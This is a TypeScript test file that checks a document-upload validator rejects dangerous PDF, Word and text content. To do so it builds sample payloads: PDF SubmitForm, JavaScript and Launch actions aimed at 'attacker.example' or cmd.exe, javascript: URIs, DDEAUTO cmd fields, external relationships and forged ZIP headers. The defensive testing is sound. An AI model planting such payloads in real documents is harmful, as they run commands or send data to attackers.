import { readFile } from "node:fs/promises";
import * as cfb from "@stackline/cfb";
import { PDFDocument, PDFName, PDFString } from "pdf-lib";
import { describe, expect, it } from "vitest";
import { validateDocumentContent } from "@/modules/documents/application/validate-content";

const docxMime =
  "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
const png = (name: string) =>
  new URL(`../fixtures/documents/${name}`, import.meta.url);
function crc32(bytes: Buffer) {
  let crc = 0xffffffff;
  for (const byte of bytes) {
    crc ^= byte;
    for (let i = 0; i < 8; i++) crc = (crc >>> 1) ^ (0xedb88320 & -(crc & 1));
  }
  return (crc ^ 0xffffffff) >>> 0;
}
function zip(parts: Record<string, string>, descriptor = false) {
  const locals: Buffer[] = [];
  const central: Buffer[] = [];
  let offset = 0;
  for (const [name, text] of Object.entries(parts)) {
    const filename = Buffer.from(name);
    const data = Buffer.from(text);
    const sum = crc32(data);
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(descriptor ? 8 : 0, 6);
    if (!descriptor) {
      local.writeUInt32LE(sum, 14);
      local.writeUInt32LE(data.length, 18);
      local.writeUInt32LE(data.length, 22);
    }
    local.writeUInt16LE(filename.length, 26);
    const header = Buffer.alloc(46);
    header.writeUInt32LE(0x02014b50, 0);
    header.writeUInt16LE(20, 4);
    header.writeUInt16LE(20, 6);
    header.writeUInt16LE(descriptor ? 8 : 0, 8);
    header.writeUInt32LE(sum, 16);
    header.writeUInt32LE(data.length, 20);
    header.writeUInt32LE(data.length, 24);
    header.writeUInt16LE(filename.length, 28);
    header.writeUInt32LE(offset, 42);
    const tail = Buffer.alloc(descriptor ? 16 : 0);
    if (descriptor) {
      tail.writeUInt32LE(0x08074b50, 0);
      tail.writeUInt32LE(sum, 4);
      tail.writeUInt32LE(data.length, 8);
      tail.writeUInt32LE(data.length, 12);
    }
    locals.push(local, filename, data, tail);
    central.push(header, filename);
    offset += local.length + filename.length + data.length + tail.length;
  }
  const centralBytes = Buffer.concat(central);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(central.length / 2, 8);
  end.writeUInt16LE(central.length / 2, 10);
  end.writeUInt32LE(centralBytes.length, 12);
  end.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, centralBytes, end]);
}
const contentTypes = `<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>`;
const rootRelationship = `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>`;
const doc = (body: string) =>
  `<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">${body}</w:document>`;
const parts = (body: string, rel = rootRelationship) => ({
  "[Content_Types].xml": contentTypes,
  "_rels/.rels": rel,
  "word/document.xml": doc(body),
});
const checkDocx = (bytes: Uint8Array) =>
  validateDocumentContent(bytes, "test.docx", docxMime);
function pdf(openAction: string) {
  const objects = [
    `<< /Type /Catalog /Pages 2 0 R /OpenAction ${openAction} >>`,
    "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
    "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] >>",
  ];
  let content = "%PDF-1.4\n";
  const offsets: number[] = [];
  for (const [index, object] of objects.entries()) {
    offsets.push(Buffer.byteLength(content));
    content += `${index + 1} 0 obj\n${object}\nendobj\n`;
  }
  const xref = Buffer.byteLength(content);
  content += `xref\n0 4\n0000000000 65535 f \n${offsets.map((offset) => `${String(offset).padStart(10, "0")} 00000 n \n`).join("")}trailer\n<< /Size 4 /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
  return Buffer.from(content);
}

describe("document content structure", () => {
  it("rejects unsupported PDF actions in links, additional actions and chained actions", async () => {
    const make = async (
      actionName: string,
      location: "link" | "additional" | "chain",
    ) => {
      const document = await PDFDocument.create();
      const page = document.addPage();
      const unsafe = document.context.obj({
        S: PDFName.of(actionName),
        F: "https://attacker.example/collect",
      });
      if (location === "link") {
        const annotation = document.context.obj({
          Type: PDFName.of("Annot"),
          Subtype: PDFName.of("Link"),
          Rect: [0, 0, 30, 30],
          A: document.context.register(unsafe),
        });
        page.node.set(
          PDFName.of("Annots"),
          document.context.obj([document.context.register(annotation)]),
        );
      } else if (location === "additional") {
        document.catalog.set(
          PDFName.of("AA"),
          document.context.obj({ WC: document.context.register(unsafe) }),
        );
      } else {
        const first = document.context.obj({
          S: PDFName.of("Named"),
          N: PDFName.of("NextPage"),
          Next: [document.context.register(unsafe)],
        });
        document.catalog.set(
          PDFName.of("OpenAction"),
          document.context.register(first),
        );
      }
      return document.save({ useObjectStreams: true });
    };
    for (const action of [
      "SubmitForm",
      "ImportData",
      "JavaScript",
      "GoToR",
      "UnknownAction",
    ]) {
      for (const location of ["link", "additional", "chain"] as const) {
        await expect(
          validateDocumentContent(
            await make(action, location),
            "test.pdf",
            "application/pdf",
          ),
        ).rejects.toThrow();
      }
    }
  });

  it("allows a safe PDF link and rejects a non-web URI", async () => {
    for (const [uri, allowed] of [
      ["https://example.com/cv", true],
      ["file:///tmp/x", false],
      ["javascript:alert(1)", false],
    ] as const) {
      const document = await PDFDocument.create();
      const page = document.addPage();
      const annotation = document.context.obj({
        Type: PDFName.of("Annot"),
        Subtype: PDFName.of("Link"),
        Rect: [0, 0, 30, 30],
        A: { S: PDFName.of("URI"), URI: PDFString.of(uri) },
      });
      page.node.set(
        PDFName.of("Annots"),
        document.context.obj([document.context.register(annotation)]),
      );
      const result = validateDocumentContent(
        await document.save(),
        "test.pdf",
        "application/pdf",
      );
      if (allowed) await expect(result).resolves.toBeDefined();
      else await expect(result).rejects.toThrow();
    }
  });

  it("rejects Launch actions even when indirect objects are compressed", async () => {
    await expect(
      validateDocumentContent(
        pdf("<< /S /Launch /F (cmd.exe) >>"),
        "test.pdf",
        "application/pdf",
      ),
    ).rejects.toThrow();
    const document = await PDFDocument.create();
    document.addPage();
    const action = document.context.obj({
      S: PDFName.of("Launch"),
      F: "cmd.exe",
    });
    document.catalog.set(
      PDFName.of("OpenAction"),
      document.context.register(action),
    );
    const compressed = await document.save({ useObjectStreams: true });
    await expect(
      validateDocumentContent(compressed, "test.pdf", "application/pdf"),
    ).rejects.toThrow();
  });

  it("rejects DDE fields in simple and split complex Word instructions", async () => {
    for (const body of [
      `<w:body><w:fldSimple w:instr=" DDEAUTO cmd topic item"/></w:body>`,
      `<w:body><w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> D</w:instrText></w:r><w:r><w:instrText>DEAUTO cmd topic</w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r></w:p></w:body>`,
      `<w:body><w:p><w:r><w:instrText> DDE cmd topic</w:instrText></w:r></w:p></w:body>`,
    ])
      await expect(checkDocx(zip(parts(body)))).rejects.toThrow();
    await expect(
      checkDocx(zip(parts(`<w:body><w:fldSimple w:instr=" PAGE "/></w:body>`))),
    ).resolves.toBeDefined();
  });

  it("rejects a binary DOC DDE field split between compressed and Unicode pieces", async () => {
    const original = await readFile(png("valid.doc"));
    for (const text of ["DDEAUTO cmd topic", "DDE cmd topic", "PAGE"]) {
      const container = cfb.read(original, { type: "buffer", WTF: true });
      const entry = cfb.find(container, "WordDocument")!;
      const oldWord = Buffer.from(entry.content!);
      const first = Buffer.from("\x13 " + text.slice(0, 1), "latin1");
      const second = Buffer.from(text.slice(1) + "\x15", "utf16le");
      const word = Buffer.concat([oldWord, first, second]);
      const tableName = word.readUInt16LE(10) & 0x0200 ? "1Table" : "0Table";
      const oldTable = Buffer.from(cfb.find(container, tableName)!.content!);
      const clx = Buffer.alloc(33);
      clx[0] = 2;
      clx.writeUInt32LE(28, 1);
      clx.writeUInt32LE(0, 5);
      clx.writeUInt32LE(first.length, 9);
      clx.writeUInt32LE(first.length + second.length / 2, 13);
      clx.writeUInt32LE((oldWord.length * 2) | 0x40000000, 19);
      clx.writeUInt32LE(oldWord.length + first.length, 27);
      let pos = 32;
      pos += 2 + word.readUInt16LE(pos) * 2;
      pos += 2 + word.readUInt16LE(pos) * 4;
      pos += 2;
      word.writeUInt32LE(oldTable.length, pos + 33 * 8);
      word.writeUInt32LE(clx.length, pos + 33 * 8 + 4);
      cfb.utils.cfb_add(container, "WordDocument", word);
      cfb.utils.cfb_add(container, tableName, Buffer.concat([oldTable, clx]));
      const result = validateDocumentContent(
        cfb.write(container, { type: "buffer" }) as Buffer,
        "test.doc",
        "application/msword",
      );
      if (text === "PAGE") await expect(result).resolves.toBeDefined();
      else await expect(result).rejects.toThrow();
    }
  });
  it("rejects a binary DOC with encryption flags or invalid FIB/table bounds", async () => {
    const original = await readFile(png("valid.doc"));
    for (const mutate of [
      (word: Buffer) => word.writeUInt16LE(word.readUInt16LE(10) | 0x0100, 10),
      (word: Buffer) => word.writeUInt16LE(word.readUInt16LE(10) | 0x8000, 10),
      (word: Buffer) => word.writeUInt16LE(0xffff, 32),
      (word: Buffer) => word.writeUInt32LE(0xffffffff, 166),
    ]) {
      const container = cfb.read(original, { type: "buffer", WTF: true });
      const word = cfb.find(container, "WordDocument");
      expect(word?.content).toBeTruthy();
      mutate(word!.content as Buffer);
      const changed = cfb.write(container, { type: "buffer" }) as Buffer;
      await expect(
        validateDocumentContent(changed, "test.doc", "application/msword"),
      ).rejects.toThrow();
    }
  });
  it("allows a PDF opening destination while rejecting a JavaScript open action", async () => {
    await expect(
      validateDocumentContent(
        pdf("[3 0 R /Fit]"),
        "test.pdf",
        "application/pdf",
      ),
    ).resolves.toEqual({ mime: "application/pdf" });
    await expect(
      validateDocumentContent(
        pdf("<< /S /JavaScript /JS (app.alert\\(1\\)) >>"),
        "test.pdf",
        "application/pdf",
      ),
    ).rejects.toThrow();
  });
  it("rejects local ZIP filename, flags, method or size inconsistent with the central directory", async () => {
    const original = await readFile(png("valid.docx"));
    for (const mutate of [
      (b: Buffer) => {
        b[30] ^= 1;
      },
      (b: Buffer) => {
        b.writeUInt16LE(b.readUInt16LE(6) ^ 0x8, 6);
      },
      (b: Buffer) => {
        b.writeUInt16LE(b.readUInt16LE(8) ^ 0x8, 8);
      },
      (b: Buffer) => {
        b.writeUInt32LE(b.readUInt32LE(18) + 1, 18);
      },
    ]) {
      const changed = Buffer.from(original);
      mutate(changed);
      await expect(checkDocx(changed)).rejects.toThrow();
    }
  });
  it("requires a Word body and a real internal officeDocument relationship", async () => {
    await expect(checkDocx(zip(parts("<w:body/>")))).resolves.toEqual({
      mime: docxMime,
    });
    await expect(checkDocx(zip(parts("<w:p/>")))).rejects.toThrow();
    await expect(
      checkDocx(
        zip(
          parts(
            "<w:body/>",
            rootRelationship.replace("word/document.xml", "other.xml"),
          ),
        ),
      ),
    ).rejects.toThrow();
    await expect(
      checkDocx(
        zip(
          parts(
            "<w:body/>",
            rootRelationship.replace(
              "Target=",
              'TargetMode="External" Target=',
            ),
          ),
        ),
      ),
    ).rejects.toThrow();
  });
  it("rejects an active altChunk relationship", async () => {
    const active = rootRelationship.replace(
      "</Relationships>",
      '<Relationship Id="r2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk" Target="word/part.html"/></Relationships>',
    );
    await expect(checkDocx(zip(parts("<w:body/>", active)))).rejects.toThrow();
  });
  it("validates ZIP data descriptors against central metadata", async () => {
    const archive = zip(parts("<w:body/>"), true);
    await expect(checkDocx(archive)).resolves.toEqual({ mime: docxMime });
    const signature = archive.indexOf(Buffer.from([0x50, 0x4b, 0x07, 0x08]));
    expect(signature).toBeGreaterThan(0);
    const changed = Buffer.from(archive);
    changed.writeUInt32LE(
      (changed.readUInt32LE(signature + 4) ^ 1) >>> 0,
      signature + 4,
    );
    await expect(checkDocx(changed)).rejects.toThrow();
  });
  it("accepts UTF-8, UTF-16 with BOM and Windows-1250 while rejecting controls and HTML", async () => {
    const check = (bytes: Uint8Array) =>
      validateDocumentContent(bytes, "test.txt", "text/plain");
    for (const value of [
      Buffer.from("Zażółć", "utf8"),
      Buffer.concat([
        Buffer.from([0xff, 0xfe]),
        Buffer.from("Zażółć", "utf16le"),
      ]),
      Buffer.from([0x5a, 0x61, 0xbf, 0xf3, 0xb3, 0xe6]),
    ])
      await expect(check(value)).resolves.toEqual({ mime: "text/plain" });
    await expect(check(Buffer.from("hello\0world"))).rejects.toThrow();
    await expect(
      check(Buffer.from("  <html><body>unsafe</body></html>")),
    ).rejects.toThrow();
    await expect(
      check(Buffer.from('<?xml version="1.0"?><!--x--><svg></svg>')),
    ).rejects.toThrow();
  });
});
